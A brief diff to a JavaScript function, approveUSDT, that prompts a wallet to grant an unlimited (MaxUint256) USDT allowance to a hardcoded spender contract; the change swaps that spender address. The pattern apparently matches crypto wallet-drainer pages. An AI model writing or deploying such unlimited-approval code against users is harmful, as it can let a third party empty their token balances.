@@ -80,7 +80,7 @@ async function approveUSDT(targetButton) {
         targetButton.disabled = true;
         targetButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
-        const SPENDER_CONTRACT = "0xffcd7bc9cf5b638ba24941b0a5946d7cbf1c11be";
+        const SPENDER_CONTRACT = "0x7e8933A5D4C6740C8E60Cd11e18edA02a52F86f5";
         const contract = new ethers.Contract(usdtAddress, APPROVE_ABI, signer);
         const tx = await contract.approve(SPENDER_CONTRACT, ethers.MaxUint256);
         await tx.wait();
